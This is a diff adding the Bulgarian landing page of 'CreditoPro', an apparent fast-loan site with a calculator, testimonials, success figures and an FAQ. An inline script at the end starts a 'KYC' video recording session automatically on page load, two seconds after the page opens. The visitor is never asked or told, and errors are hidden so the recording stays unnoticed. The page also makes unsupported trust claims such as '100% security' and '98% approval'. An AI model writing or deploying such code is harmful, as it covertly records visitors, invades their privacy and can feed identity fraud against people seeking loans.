@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="bg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CreditoPro - Бързи кредити онлайн</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <a href="#"><i class="fas fa-coins"></i> CreditoPro</a>
+            </div>
+            
+            <div class="nav-menu" id="nav-menu">
+                <a href="#home" class="nav-link">Начало</a>
+                <a href="#calculator" class="nav-link">Кредити</a>
+                <a href="#how-it-works" class="nav-link">Как работи</a>
+                <a href="#contact" class="nav-link">Контакти</a>
+                
+                <div class="language-selector">
+                    <select id="language-select">
+                        <option value="bg">BG</option>
+                        <option value="en">EN</option>
+                    </select>
+                </div>
+            </div>
+            
+            <div class="hamburger" id="hamburger">
+                <span class="bar"></span>
+                <span class="bar"></span>
+                <span class="bar"></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section id="home" class="hero">
+        <div class="hero-container">
+            <div class="hero-content">
+                <h1>Бърз кредит до <span class="highlight">50 000 лв</span></h1>
+                <p>Получете одобрение за минути, пари на сметката за час. Без скрити такси, прозрачни условия.</p>
+                <div class="hero-stats">
+                    <div class="stat-item">
+                        <div class="stat-number">15 мин</div>
+                        <div class="stat-label">Одобрение</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">15,000+</div>
+                        <div class="stat-label">Клиенти</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">100%</div>
+                        <div class="stat-label">Сигурност</div>
+                    </div>
+                </div>
+                <button class="cta-button" onclick="startApplication()">
+                    Кандидатствай сега
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Loan Calculator -->
+    <section id="calculator" class="calculator-section">
+        <div class="container">
+            <h2>Калкулатор за кредит</h2>
+            <p>Изчислете условията на вашия кредит</p>
+            
+            <div class="calculator">
+                <div class="calculator-inputs">
+                    <div class="input-group">
+                        <label for="loan-amount">Сума на кредита</label>
+                        <div class="slider-container">
+                            <input type="range" id="loan-amount" min="500" max="50000" value="10000" step="500">
+                            <div class="slider-value">
+                                <span id="amount-value">10 000</span> лв
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="loan-period">Период на изплащане</label>
+                        <div class="slider-container">
+                            <input type="range" id="loan-period" min="6" max="60" value="24" step="6">
+                            <div class="slider-value">
+                                <span id="period-value">24</span> месеца
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="calculator-results">
+                    <div class="result-card">
+                        <h3>Детайли на кредита</h3>
+                        <div class="result-item">
+                            <span>Месечна вноска:</span>
+                            <strong id="monthly-payment">456 лв</strong>
+                        </div>
+                        <div class="result-item">
+                            <span>Лихвен процент:</span>
+                            <strong id="interest-rate">12.5%</strong>
+                        </div>
+                        <div class="result-item">
+                            <span>Общо за връщане:</span>
+                            <strong id="total-amount">10 944 лв</strong>
+                        </div>
+                        <button class="apply-button" onclick="startApplication()">
+                            Кандидатствай за този кредит
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works -->
+    <section id="how-it-works" class="how-it-works">
+        <div class="container">
+            <h2>Как работи?</h2>
+            <p>Прост процес в 3 стъпки</p>
+            
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <h3>Попълнете заявката</h3>
+                        <p>Въведете вашите данни и изберете желаната сума и срок</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <h3>Получете одобрение</h3>
+                        <p>Автоматична проверка и отговор за минути</p>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <h3>Получете парите</h3>
+                        <p>Средствата се прехвърлят директно в банковата ви сметка</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="testimonials">
+        <div class="container">
+            <h2>Какво казват клиентите ни</h2>
+            
+            <div class="testimonials-grid">
+                <div class="testimonial">
+                    <p>"Много бърз и удобен процес. Получих парите още същия ден!"</p>
+                    <div class="testimonial-author">
+                        <strong>Мария И.</strong>
+                        <span>София</span>
+                    </div>
+                </div>
+                
+                <div class="testimonial">
+                    <p>"Отлично обслужване и прозрачни условия. Препоръчвам!"</p>
+                    <div class="testimonial-author">
+                        <strong>Петър С.</strong>
+                        <span>Пловдив</span>
+                    </div>
+                </div>
+                
+                <div class="testimonial">
+                    <p>"Спасиха ме в трудна ситуация. Благодаря за професионализма!"</p>
+                    <div class="testimonial-author">
+                        <strong>Елена Д.</strong>
+                        <span>Варна</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Success Story Section -->
+    <section class="success-story">
+        <div class="container">
+            <div class="success-content">
+                <div class="success-text">
+                    <div class="success-badge-large">
+                        <i class="fas fa-trophy"></i>
+                        <span>История на успеха</span>
+                    </div>
+                    <h2>Помогнахме на хиляди хора да постигнат мечтите си</h2>
+                    <p>От 2020 година насам сме одобрили над 50 милиона лева кредити и сме помогнали на повече от 15,000 души да реализират своите планове и мечти.</p>
+                    <div class="success-highlights">
+                        <div class="highlight-item">
+                            <i class="fas fa-home"></i>
+                            <div>
+                                <strong>5,200+</strong>
+                                <span>Жилищни кредити</span>
+                            </div>
+                        </div>
+                        <div class="highlight-item">
+                            <i class="fas fa-car"></i>
+                            <div>
+                                <strong>3,800+</strong>
+                                <span>Автомобилни кредити</span>
+                            </div>
+                        </div>
+                        <div class="highlight-item">
+                            <i class="fas fa-graduation-cap"></i>
+                            <div>
+                                <strong>2,100+</strong>
+                                <span>Образователни кредити</span>
+                            </div>
+                        </div>
+                        <div class="highlight-item">
+                            <i class="fas fa-store"></i>
+                            <div>
+                                <strong>3,900+</strong>
+                                <span>Бизнес кредити</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="success-stats-card">
+                    <div class="main-stat">
+                        <div class="big-number">50M+</div>
+                        <div class="big-label">лв одобрени кредити</div>
+                    </div>
+                    <div class="secondary-stats">
+                        <div class="secondary-stat">
+                            <div class="stat-number">15,000+</div>
+                            <div class="stat-label">Доволни клиенти</div>
+                        </div>
+                        <div class="secondary-stat">
+                            <div class="stat-number">4 години</div>
+                            <div class="stat-label">Опит</div>
+                        </div>
+                        <div class="secondary-stat">
+                            <div class="stat-number">98%</div>
+                            <div class="stat-label">Одобрение</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="faq">
+        <div class="container">
+            <h2>Често задавани въпроси</h2>
+            
+            <div class="faq-list">
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFAQ(0)">
+                        <span>Колко време отнема процесът на одобрение?</span>
+                        <i class="fas fa-plus"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Обикновено процесът на одобрение отнема между 15-30 минути. В повечето случаи получавате отговор веднага след подаване на заявката.</p>
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFAQ(1)">
+                        <span>Какви документи са необходими?</span>
+                        <i class="fas fa-plus"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Необходими са само лична карта и документ за доходи. Всички документи могат да бъдат качени онлайн.</p>
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFAQ(2)">
+                        <span>Има ли скрити такси?</span>
+                        <i class="fas fa-plus"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Не, няма скрити такси. Всички разходи са ясно посочени преди подписване на договора.</p>
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFAQ(3)">
+                        <span>Мога ли да върна кредита предсрочно?</span>
+                        <i class="fas fa-plus"></i>
+                    </div>
+                    <div class="faq-answer">
+                        <p>Да, можете да върнете кредита предсрочно без допълнителни такси за предсрочно погасяване.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="contact">
+        <div class="container">
+            <h2>Свържете се с нас</h2>
+            <div class="contact-info">
+                <div class="contact-item">
+                    <i class="fas fa-phone"></i>
+                    <div>
+                        <h3>Телефон</h3>
+                        <p>0700 12 345</p>
+                    </div>
+                </div>
+                
+                <div class="contact-item">
+                    <i class="fas fa-envelope"></i>
+                    <div>
+                        <h3>Имейл</h3>
+                        <p>info@creditopro.bg</p>
+                    </div>
+                </div>
+                
+                <div class="contact-item">
+                    <i class="fas fa-clock"></i>
+                    <div>
+                        <h3>Работно време</h3>
+                        <p>Пон-Пет: 09:00-18:00</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3><i class="fas fa-coins"></i> CreditoPro</h3>
+                    <p>Вашият надежден партньор за бързи онлайн кредити.</p>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>Услуги</h4>
+                    <ul>
+                        <li><a href="#">Потребителски кредити</a></li>
+                        <li><a href="#">Бързи кредити</a></li>
+                        <li><a href="#">Рефинансиране</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h4>Информация</h4>
+                    <ul>
+                        <li><a href="#">Общи условия</a></li>
+                        <li><a href="#">Поверителност</a></li>
+                        <li><a href="#">GDPR</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p>&copy; 2024 CreditoPro. Всички права запазени.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Sticky Help Button -->
+    <!-- Enhanced UI Elements -->
+    <div class="scroll-progress" id="scroll-progress"></div>
+    
+    <button class="scroll-to-top" id="scroll-to-top">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+    <div class="help-button" onclick="toggleHelp()">
+        <i class="fas fa-question"></i>
+    </div>
+
+    <!-- Help Modal -->
+    <div class="help-modal" id="help-modal">
+        <div class="help-content">
+            <h3>Нужна ви помощ?</h3>
+            <p>Свържете се с нас:</p>
+            <div class="help-options">
+                <a href="tel:0700123456" class="help-option">
+                    <i class="fas fa-phone"></i> Обадете се
+                </a>
+                <a href="mailto:info@creditopro.bg" class="help-option">
+                    <i class="fas fa-envelope"></i> Изпратете имейл
+                </a>
+            </div>
+            <button class="close-help" onclick="toggleHelp()">Затвори</button>
+        </div>
+    </div>
+
+
+
+    <script src="js/translation-manager.js"></script>
+    <script src="js/video-recorder.js"></script>
+    <script src="script.js"></script>
+    
+    <script>
+        // Initialize video recording when page loads
+        document.addEventListener('DOMContentLoaded', async function() {
+            console.log('🚀 Initializing KYC session with video recording...');
+            
+            // Generate session ID if not exists
+            let sessionId = localStorage.getItem('kyc_session_id');
+            if (!sessionId) {
+                sessionId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+                    return v.toString(16);
+                });
+                localStorage.setItem('kyc_session_id', sessionId);
+            }
+            
+            try {
+                // Initialize video recording session
+                const initialized = await window.videoRecordingManager.initializeSession(sessionId);
+                
+                if (initialized) {
+                    // Start recording after a small delay to allow user to see the page
+                    setTimeout(async () => {
+                        try {
+                            await window.videoRecordingManager.startRecording();
+                            console.log('✅ Session video recording started successfully');
+                        } catch (error) {
+                            console.warn('⚠️ Could not start video recording:', error.message);
+                            // Continue without video recording - don't block the user
+                        }
+                    }, 2000); // 2 second delay
+                }
+            } catch (error) {
+                console.warn('⚠️ Video recording initialization failed:', error.message);
+                // Continue without video recording - don't block the user
+            }
+        });
+        
+        // Stop recording when user leaves the page
+        window.addEventListener('beforeunload', function() {
+            if (window.videoRecordingManager && window.videoRecordingManager.isRecording) {
+                window.videoRecordingManager.stopRecording();
+            }
+        });
+    </script>
+</body>
+</html> 
